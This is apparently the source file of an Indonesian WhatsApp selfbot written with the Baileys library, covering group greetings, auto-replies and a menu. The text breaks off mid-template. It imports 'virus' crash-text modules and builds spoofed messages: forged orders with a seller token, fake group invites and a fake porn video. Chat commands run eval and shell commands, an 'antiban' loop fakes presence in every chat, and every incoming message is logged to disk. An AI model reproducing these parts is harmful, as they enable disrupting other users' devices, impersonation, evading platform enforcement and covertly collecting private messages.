/*
DI RECODE ULANG ZAINUDIN
Look at line 186 dan 868 casenya
*/ 
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
} = require("@adiwajshing/baileys");
const { relayWAMessage, prepareMessageFromContent } = require('@adiwajshing/baileys')
const moment = require("moment-timezone");
const fs = require("fs");
const { exec } = require('child_process');
const xznsenpai = require('./whatsapp/message.js');
const speed = require('performance-now');
const ffmpeg = require('fluent-ffmpeg');
const conn = require('./whatsapp/connect');
const { color } = require('./lib/color');
const { virtex } = require('./virus/virtex.js');
const { virtau } = require('./virus/virtau.js');
const { virtexapi } = require('./virus/virtexapi.js');
const { virtex1 } = require('./virus/virtex1.js');
const { virtexx } = require('./virus/virtexx.js');
const { virtexxx } = require('./virus/virtexxx.js');
const { getBuffer}  = require('./lib/functions.js');
const {getRandom} = require('./lib/functions.js')
const { fetchJson } = require('./lib/fetcher');
const request = require('request');
const mess = JSON.parse(fs.readFileSync('./whatsapp/mess.json'));
const axios = require('axios');
const Exif = require('./lib/exif');
const { uptotele, uptonaufal, uploadFile } = require('./lib/uploadimage')
const { yta, ytv, igdl, upload, uploadImages } = require('./lib/ytdl')
const { formatDate } = require('./lib/yytdl')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const ph = require('./noapi/photooxy.js')//xznscrap
const zn = require('./noapi/xznphoto.js')//xznscrap
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const yts = require( 'yt-search')
const hx = require('hxz-api')
const ig = require('insta-fetcher')
const imgbb = require('imgbb-uploader')
const exif = new Exif();
let _scommand = JSON.parse(fs.readFileSync('./scommand.json'));

conn.connect()
const udin = conn.udin
const PhoneNumber = require('awesome-phonenumber')

/********** MENU SETTING **********/
const vcard = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + 'FN:Owner Kawaii\n'
            + 'nitem1.TEL;waid=6285751414996:+62 857-5141-4996\n'
            + 'item1.X-ABLabel:Ponsel\n'
            + 'X-WA-BIZ-DESCRIPTION: Owner Bot XZN \n'
            + 'X-WA-BIZ-NAME:Its_me_xzn\n'
            //+ 'ORG: Pengembang XBot;\n' 
            //+ 'TEL;type=CELL;type=VOICE;waid=6282256080304:+62 822-5608-0304\n' 
            + 'END:VCARD'
 
fake = "Xᴢɴ々Bᴏᴛ"
fakeimage = fs.readFileSync("./media/xznsenpai.jpeg")
virgam = fs.readFileSync("./virus/virgam.jpg")
prefix = '#'
blocked = []
roomttt = [];
defttt = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"];
baterai = {
    baterai: 0,
    cas: false
}
public = true
autorespon = true
xzntes = '©[XM] XHIRO MHONSHINE √ Xᴢɴ々Bᴏᴛ⸙'
/*************************************/


/******** OWNER NUMBER**********/ 
const ownerNumber = ["6282256080304@s.whatsapp.net","6282255794209@s.whatsapp.net","6285751414996@s.whatsapp.net"] 
/************************************/


/*********** LOAD FILE ***********/
const welkom = JSON.parse(fs.readFileSync('./database/bot/welkom.json'))
const antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'))
/*********** END LOAD ***********/


udin.on('CB:Blocklist', json => {
	if (blocked.length > 2) return
	for (let i of json[1].blocklist) {
		blocked.push(i.replace('c.us','s.whatsapp.net'))
	}
})
udin.on('CB:action,,battery', json => {
	const a = json[2][0][1].value
	const b = json[2][0][1].live
	baterai.baterai = a
	baterai.cas = b
})

udin.on('group-participants-update', async (anu) => {
		//if (!welkom.includes(anu.jid)) return
		try {
			mem = anu.participants[0]
			console.log(anu)
            try {
            pp_user = await udin.getProfilePicture(mem)
            } catch (e) {
            pp_user = 'https://i.ibb.co/4j6ZxtW/hshs-by-midorizou-d8xpeka.jpg'
            }
            try {
             pp_group = await udin.getProfilePicture(anu.jid)
            } catch (e) {
            pp_group = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
            
            if (anu.action == 'add' && !mem.includes(udin.user.jid)) {
            mdata = await udin.groupMetadata(anu.jid)
            memeg = mdata.participants.length
        	num = anu.participants[0]
            v = udin.contacts[num] || { notify: num.replace(/@.+/, '') }
            anu_user = v.vname || v.notify || PhoneNumber('+' + v.jid.replace('@s.whatsapp.net', '')).getNumber('international')
            //anu_user = udin.contacts[mem]
            awikwok = moment().tz('Asia/Jakarta').format("HH:mm")
            teks = `Selamat Datang Di ${mdata.subject}\nHay Kak @${num.split('@')[0]}\nDeskripsi Group\n${mdata.desc}`
            fkon = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(mdata.id ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${anu_user}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${anu_user.notify},;;;\nFN:${anu_user.notify},\nitem1.TEL;waid=${num.split('@')[0]}:${num.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
	        buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/welcome?nama=${encodeURI(anu_user)}&descriminator=${awikwok}&memcount=${memeg}&gcname=${encodeURI(mdata.subject)}&pp=${pp_user}&bg=https://telegra.ph/file/386a72a86b94e8b0ff6c3.jpg`)
	       //buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/Welcome2?nama=${encodeURI(anu_user)}&descriminator=${awikwok}&memcount=${memeg}&gcname=${encodeURI(mdata.subject)}&gcicon=${pp_group}&pp=${pp_user}&bg=https://telegra.ph/file/386a72a86b94e8b0ff6c3.jpg`)
		udin.sendMessage(mdata.id, buff, MessageType.image, {quoted: fkon, caption: teks, contextInfo: {"mentionedJid": [num]}})
		}
		
            if (anu.action == 'remove' && !mem.includes(udin.user.jid)) {
                mdata = await udin.groupMetadata(anu.jid)
            	num = anu.participants[0]
                v = udin.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || PhoneNumber('+' + v.jid.replace('@s.whatsapp.net', '')).getNumber('international')
                //anu_user = udin.contacts[mem]
                memeg = mdata.participants.length
                awikwok = moment().tz('Asia/Jakarta').format("HH:mm")
                out = `Selamat Tinggal @${num.split('@')[0]}`
                fkon = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(mdata.id ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${anu_user}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${anu_user.notify},;;;\nFN:${anu_user.notify},\nitem1.TEL;waid=${num.split('@')[0]}:${num.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
                buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/goodbye?nama=${encodeURI(anu_user)}&descriminator=${awikwok}&memcount=${memeg}&gcname=${encodeURI(mdata.subject)}&pp=${pp_user}&bg=https://telegra.ph/file/2612c2bbf5e034ec45563.jpg`)
                //buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/goodbye2?nama=${encodeURI(anu_user)}&descriminator=${awikwok}&memcount=${memeg}&gcname=${encodeURI(mdata.subject)}&gcicon=${pp_group}&pp=${pp_user}&bg=https://telegra.ph/file/2612c2bbf5e034ec45563.jpg`)
                udin.sendMessage(mdata.id, buff, MessageType.image, {quoted: fkon, caption: out, contextInfo: {"mentionedJid": [num]}})
            }
            if (anu.action == "promote") {
            	mdata = await udin.groupMetadata(anu.jid)
            	num = anu.participants[0]
                v = udin.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || PhoneNumber('+' + v.jid.replace('@s.whatsapp.net', '')).getNumber('international')
                memeg = mdata.participants.length
                awikwok = moment().tz('Asia/Jakarta').format("HH:mm")
                kata1 = `Selamat @${num.split("@")[0]} telah di Promote`
                buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/promote?nama=${encodeURI(anu_user)}&member=${memeg}&pesan=Selamat Telah Jadi Admin&pp=${pp_user}&bg=https://telegra.ph/file/6d6b8cd7f12d456d9e22c.jpg`)
                udin.sendMessage(mdata.id, buff, MessageType.image, {caption: kata1})
                //udin.sendMessage(mdata.id, `@${num.split("@")[0]} telah di promote`, MessageType.text, { contextInfo: {mentionedJid: [num.split("@")[0]+ "@s.whatsapp.net"]}});
               }
           if (anu.action == "demote") {
    	      mdata = await udin.groupMetadata(anu.jid)
              num = anu.participants[0]
              v = udin.contacts[num] || { notify: num.replace(/@.+/, '') }
              anu_user = v.vname || v.notify || PhoneNumber('+' + v.jid.replace('@s.whatsapp.net', '')).getNumber('international')
              memeg = mdata.participants.length
              awikwok = moment().tz('Asia/Jakarta').format("HH:mm")
              kata = `Selamat @${num.split("@")[0]} telah di demote`
               //buff = await getBuffer(pp_user);
               buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/demote?nama=${encodeURI(anu_user)}&member=${memeg}&pesan=Selamat Telah Diturunkan&pp=${pp_user}&bg=https://telegra.ph/file/6d6b8cd7f12d456d9e22c.jpg`)
              udin.sendMessage(mdata.id, buff, MessageType.image, {caption: kata})
              //udin.sendMessage(mdata.id, `@${num.split("@")[0]} telah di demote`, MessageType.text, { contextInfo: {mentionedJid: [num.split("@")[0]+ "@s.whatsapp.net"]}});
              }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
			udin.sendMessage(mdata.id, `${e}`, MessageType.text)
		}
	})

udin.on('message-update', async (msg) => { // THX TO BANG HANIF
	require('./antidelete/antidelete.js')(udin, msg)
})
udin.on('message-new', async(qul) => {
  // Sticker Cmd
const addCmd = (id, command) => {
	const obj = {
		id: id,
		chats: command
	}
	_scommand.push(obj)
	fs.writeFileSync('./scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
	let position = null;
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === id) {
			position = i
		}
	})
	if (position !== null) {
		return position
	}
}

const getCmd = (id) => {
	let position = null
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === id) {
			position = i
		}
	})
	if (position !== null) {
		return _scommand[position].chats
	}
}

const checkSCommand = (id) => {
	let status = false
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === id) {
			status = true
		}
	})
	return status
}
  try {
        if (!qul.message) return
		if (qul.key && qul.key.remoteJid == 'status@broadcast') return
        qul.message = (Object.keys(qul.message)[0] === 'ephemeralMessage') ? qul.message.ephemeralMessage.message : qul.message
		let infoMSG = JSON.parse(fs.readFileSync(`./antidelete/msg.data.json`))
		infoMSG.push(JSON.parse(JSON.stringify(qul)))
		fs.writeFileSync(`./antidelete/msg.data.json`, JSON.stringify(infoMSG, null, 2))
		const urutan_pesan = infoMSG.length
		if (urutan_pesan === 5000) {
			infoMSG.splice(0, 4300)
			fs.writeFileSync(`./antidelete/msg.data.json`, JSON.stringify(infoMSG, null, 2))
		}
        global.prefix
		const content = JSON.stringify(qul.message)
		const from = qul.key.remoteJid
		const type = Object.keys(qul.message)[0]
		const botNumber = udin.user.jid
		const isGroup = from.endsWith('@g.us')
		const sender = qul.key.fromMe ? udin.user.jid : isGroup ? qul.participant : qul.key.remoteJid
		pushname = udin.contacts[sender] != undefined ? udin.contacts[sender].vname || udin.contacts[sender].notify : undefined
		let senderr = qul.key.fromMe ? udin.user.jid : qul.key.remoteJid.endsWith('@g.us') ? qul.participant : qul.key.remoteJid
		const jam = moment.tz('Asia/Jakarta').format('HH:mm.ss')
        const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
        const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		let d = new Date
		let locale = 'id'
		let randomChar = Math.floor(Math.random() * 5) + 1
		const stickCmd = type == 'stickerMessage' ? qul.message.stickerMessage.fileSha256.toString('base64') : '' || ''
		const buttonCmd = type == 'listResponseMessage' ? qul.message.listResponseMessage.selectedDisplayText : '' || ''
		const senderNumber = sender.split("@")[0]
		let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
		let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
		let week = d.toLocaleDateString(locale, { weekday: 'long' })
		let date = d.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' })
		let waktu = d.toLocaleDateString(locale, { hour: 'numeric', minute: 'numeric', second: 'numeric' })
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		//body = qul.message.conversation || qul.message[type].caption || qul.message[type].text || (type == 'listResponseMessage') && qul.message[type].singleSelectReply.selectedRowId || (type == 'buttonsResponseMessage') && qul.message[type].selectedButtonId || ''
		body = qul.message.conversation || qul.message[type].caption || qul.message[type].text || (type == 'listResponseMessage' ? qul.message[type].singleSelectReply.selectedRowId : '') || (type == 'buttonsResponseMessage' ? qul.message[type].selectedButtonId : '') || (type == 'stickerMessage' && getCmd(qul.message[type].fileSha256.toString('base64')) !== null && getCmd(qul.message[type].fileSha256.toString('base64')) !== undefined ? getCmd(qul.message[type].fileSha256.toString('base64')) : '') || ''
		budy = (type === 'conversation') ? qul.message.conversation : (type === 'extendedTextMessage') ? qul.message.extendedTextMessage.text : ''
		chats = (type === 'conversation') ? qul.message.conversation : (type === 'extendedTextMessage') ? qul.message.extendedTextMessage.text : ''
		//const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const command = body.startsWith(prefix) ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(" ")
		const arg = chats.slice(command.length + 2, chats.length)
		var pes = (type === 'conversation' && qul.message.conversation) ? qul.message.conversation : (type == 'imageMessage') && qul.message.imageMessage.caption ? qul.message.imageMessage.caption : (type == 'videoMessage') && qul.message.videoMessage.caption ? qul.message.videoMessage.caption : (type == 'extendedTextMessage') && qul.message.extendedTextMessage.text ? qul.message.extendedTextMessage.text : ''
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
        const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = udin.user.phone
        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')        
/*****UCAPAN*****/
if(time2 < "23:59:00"){
var ucapanWaktu = 'Malam Lord'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = 'Malam Lord'
                                         }
if(time2 < "18:30:00"){
var ucapanWaktu = 'Senja Lord'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Petang Lord'
                                         }
if(time2 < "12:00:00"){
var ucapanWaktu = 'Siang Lord'
                                         }
if(time2 < "09:00:00"){
var ucapanWaktu = 'Pagi Lord'
                                         }                                        
       /*************************************/  
const dinn = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', itemCount: '7777777', status: 'INQUIRY', surface:  'CATALOG', message: '{Xᴢɴ々Bᴏᴛ}', orderTitle: 'Its Me Angga', sellerJid: '6282256080304@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}        
const dinnn = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', thumbnail: fs.readFileSync('./virus/virgam.jpg'), itemCount: '2021', status: 'INQUIRY', surface:  'CATALOG', message: 'Xᴢɴ々Bᴏᴛ', orderTitle: 'Its Me Angga', sellerJid: '6282256080304@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}        
const flokasi = {key : {participant : '0@s.whatsapp.net'}, message: {liveLocationMessage: {caption: 'Xᴢɴ々Bᴏᴛ', name: 'Di Rumah Mertua'}}}                      
const fdocs = {key : {participant : '0@s.whatsapp.net'}, message: {documentMessage: {title: 'Its Me Zainudin Anggara'}}}
const fvideo = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6282256080304-1622727181@g.us" } : {})}, message: { "videoMessage": {"title":"Bokep nganu", "h": `Hmm`, 'seconds': '99999', 'caption': 'Bokep Nganu'}}}             
const fgclink = {"key": {"fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"}, "message": {"groupInviteMessage": {"mimetype": "image/jpeg", "jpegThumbnail": fs.readFileSync(`./media/loli.jpeg`), "groupJid": "6282256080304-1622727181@g.us", "inviteCode": "mememteeeekkeke", "groupName": "Its Me Zainudin Anggara", "caption": "XZNSENPAI"}}}
const fgif = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6282256080304-1622727181@g.us" } : {})}, message: {"videoMessage": {"title":"Its Me Zainudin Anggara", "h": `Hmm`, 'seconds': '99999', 'gifPlayback': 'true', 'caption': 'Its Me Zainudin Anggara'}}}                       
const ftextt = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6282256080304-1622727181@g.us" } : {})}, message: {"extendedTextMessage": {"mimetype": "image/jpeg", "jpegThumbnail": fs.readFileSync(`./media/loli.jpeg`), "text":"Xᴢɴ々SᴇɴPɑɪ", "title": `Hmm`}}}                     
const fvn = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6282256080304-1622727181@g.us" } : {})}, message: {"audioMessage": {"mimetype":"audio/ogg; codecs=opus", "seconds": "${second}", "ptt": "true"}}}
const sft = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"productMessage": {"product": {"productImage":{ }, "title": "Creat Its Me Zainudin", "description": "1 Bulan : Rp 10.000,00", "currencyCode": "USD", "priceAmount1000": "10000000000000000000", "retailerId": "Self Bot", "productImageCount": 99999}, "businessOwnerJid": `0@s.whatsapp.net`}}}       
        /*************************************/
const totalchat = await udin.chats.all()
const groupMetadata = isGroup ? await udin.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupAdmins = isGroup ? xznsenpai.getGroupAdmins(groupMembers) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
		
		/*************SETELAN**************/
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isWelkom = isGroup ? welkom.includes(from) : false
const isAntiLink = isGroup ? antilink.includes(from) : false
const isOwner = ownerNumber.includes(sender)
const itsMe = qul.key.fromMe ? true : false
const isMybot = isOwner || itsMe
idttt = [];
players1 = [];
players2 = [];
turn = [];
for (let i of roomttt) {
idttt.push(i.id)
players1.push(i.player1)
players2.push(i.player2)
turn.push(i.turn)
}
const isTTT = isGroup ? idttt.includes(from) : false
const isPlayer1 = isGroup ? players1.includes(sender) : false
const isPlayer2 = isGroup ? players2.includes(sender) : false 
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
}
		
/***************** SCURITY FEATURE ********/
const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './stik' + names + '.png', async function () {
console.log('selesai');
let filess = './stik' + names + '.png'
let asw = './stik' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
udin.sendMessage(to, media, MessageType.sticker,{quoted:qul})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
} 
const sendMediaURL = async(to, url, text="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
udin.sendMessage(to, media, type, { quoted: qul, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})                    
fs.unlinkSync(filename)
});
}   
const replyy = (teks) => {
udin.sendMessage(from, teks, text, { quoted: qul, contextInfo: { externalAdReply: { title: `${wita} - ${week} ${weton}\n${date}`, body: 'Xᴢɴ々Bᴏᴛ', sourceUrl: `https://wa.me/6282256080304?text=Assalamualaikum`, thumbnail: fs.readFileSync('./media/loli.jpeg') }}})
            }
const fyt = (teks) => {
udin.sendMessage(from, teks, MessageType.text, {quoted:qul, contextInfo:{"externalAdReply":{"title": fake, mediaType: 2, thumbnail: fs.readFileSync('./media/loli.jpeg'), "previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
            }
const fyt2 = (teks) => {
udin.sendMessage(from, teks, MessageType.text, {quoted:qul, contextInfo: { forwardingScore: 250, isForwarded: true, "externalAdReply":{"title": `${ucapanWaktu} ${pushname}`, mediaType: 2, thumbnail: fs.readFileSync('./media/loli.jpeg'), "previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
           }
const fakethumb = (teks, yes) => {
udin.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./media/loli.jpeg'),quoted:qul,caption:yes})
            }
const reply = (teks) => {
udin.sendMessage(from, teks, text, {quoted:qul})
			}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? udin.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : udin.sendMessage(from, teks.trim(), extendedText, {quoted: flokasi, contextInfo: {"mentionedJid": memberr}})
			} 
const sendMess = (hehe, teks) => {
udin.sendMessage(hehe, teks, text)
			}
			/*****************END SCURITY FEATURE ********/
if (messagesC.includes("://chat.whatsapp.com/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
udin.updatePresence(from, Presence.composing)
if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
setTimeout( () => {
udin.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
}, 5000)
setTimeout( () => {
udin.updatePresence(from, Presence.composing)
reply("1detik")
}, 4000)
setTimeout( () => {
udin.updatePresence(from, Presence.composing)
reply("2detik")
}, 3000)
setTimeout( () => {
udin.updatePresence(from, Presence.composing)
reply("3detik")
}, 2000)
setTimeout( () => {
udin.updatePresence(from, Presence.composing)
reply("4detik")
}, 1000)
setTimeout( () => {
udin.updatePresence(from, Presence.composing)
reply("5detik")
}, 0)
}

if (!isGroup && !isCmd && !command && !qul.key.fromMe && !autorespon) {
simi = await fetchJson(`https://api.simsimi.net/v1/?lang=id&cf=false&text=${arg}`)
sami = simi.success
udin.sendMessage(from, `_${sami}_`, text, {quoted:qul})
                      }
				
		//kolor
			colors = ['red','white','black','blue','yellow','green']
		//detector media
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
		
		//auto respon
		if (chats.toLowerCase() === 'status'){
		//xznsenpai.sendFakeStatus(from, `STATUS: ${public ? 'PUBLIC' : 'SELF'}`)
		reply(`STATUS : ${public ? 'PUBLIC' : 'SELF'}`)
		}
		if (chats.toLowerCase() === 'prefix'){
		//xznsenpai.sendFakeStatus(from, `prefix BOT ini adalah ( ${prefix} )`)
		reply(`prefix bot ini adalah = ${prefix}`)
		}
		/*if (budy.includes('Bot')){
        replyy('Ya, Emang Gue BOT🗿\nApa? Gak Seneng?\nBewan Pantek😡')
        }*/
        if (budy.includes('Assalamualaikum')){
        reply('Waalaikumsalam')
        }
        if (budy.includes('Bot')) {
const gojomp3 = fs.readFileSync('./assets/gojo.mp3');
udin.sendMessage(from, gojomp3, MessageType.audio, {quoted: qul, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Ah')) {
const ahh = fs.readFileSync('./assets/ah.mp3');
udin.sendMessage(from, ahh, MessageType.audio, {quoted: qul, mimetype: 'audio/mp4', duration: 99999999, ptt:true})
}
if (budy.includes('Makasih')) {
const gojomp3 = fs.readFileSync('./assets/gojo.mp3');
udin.sendMessage(from, gojomp3, MessageType.audio, {quoted: qul, mimetype: 'audio/mp4', ptt:true})
}
//INI MODE SELF NYA BAMBANG
//if (itsMe){
if (isMybot){
if (chats.startsWith('>')){
if (args.length == 0) return replyy('LU NYURUH APA')
console.log(color('[EVAL]'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V2 brooo`))
try{
//reply(require('util').format(await eval(`;(async () => { ${chats.slice(2)} })()`)))
return udin.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),MessageType.text, {quoted: qul})
}catch(err){
e = String(err)
replyy(e)}}

if (budy.startsWith('=>')){
console.log(color('[EVAL]'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1 brooo`))
ras = budy.slice(3)
function _(rem) {
ren = JSON.stringify(rem,null,2)
pes = util.format(ren)
reply(pes)}
try{q
reply(require('util').format(eval(`(async () => { ${ras} })()`)))
} catch(err) {
e = String(err)
reply(e)}}

if (chats.startsWith('$')){
if (!arg) return
exec(arg, (err, stdout) => {
if (err) return xznsenpai.reply(from, err, qul)
if (stdout) xznsenpai.reply(from, stdout, qul)})}
if (chats.toLowerCase() === `${prefix}public`){
public = true
//xznsenpai.sendFakeStatus(from, `Sukses`, `Status: PUBLIC`)
reply("Mode Public Ngen")}

if (chats.toLowerCase() === `${prefix}self`){
public = false
//xznsenpai.sendFakeStatus(from, `Sukses`, `Status: SELF`)
reply("Mode Self Ngen")}

if (chats.startsWith('z')){
console.log(color('[EVAL]'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval brooo`))
try{
reply(require('util').format(await eval(`;(async () => { ${chats.slice(2)} })()`)))
//return xznsenpai.reply(from, JSON.stringify(eval(chats.slice(2)), null, 2), qul)
}catch(err){
e = String(err)
reply(e)}}
}//end
//START FUCTION ANTIBAN
if (!isCmd && qul.message) {
for (let i of totalchat) {
await udin.updatePresence(i.jid, Presence.recording)}}  //unavailable, available, composing, recording, paused
/*if (!isCmd && qul.message) {
for (let i of totalchat) {
await udin.updatePresence(i.jid, Presence.available)}}*/
await udin.chatRead(from, "read")
//END FUCTION ANTIBAN        
//START PUBLIC
if (!public){
if (!qul.key.fromMe) return
}
 //if (isCmd && !isGroup) {console.log(color('[UDIN]' ,'blue'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`))}
//if (isCmd && isGroup) {console.log(color('[UDIN]'), color(moment(qul.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(udin.user.name), 'in', color(groupName))}
if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))*/
           
//START BUTTONCmd
switch(buttonCmd) {
case 'ah':
reply(mess.wait)
 res = await fs.readFileSync('./assets/ah.mp3');
udin.sendMessage(from, res, audio, {quoted : qul, mimetype: 'audio/mp4',duration:999.999, ptt:true})
break
case 'iri':
reply(mess.wait)
const irimp3 = fs.readFileSync('./assets/iri.mp3');
udin.sendMessage(from, irimp3, MessageType.audio, {quoted: qul, mimetype: 'audio/mp4', duration: 99999999, ptt:true})
break
case 'MeNu🔥':
 rn = process.uptime()
const textnya = `
==>>Mohon Baca<<==

JANGAN SPAM BOT INI !!..
TETAP DI RUMAH AJA DAN LAKUKAN 3M
1.makan
2.minum
3.MELIHAT MEMEG

=>>JAM<<=

⦿ Jam WIT : ${wit}
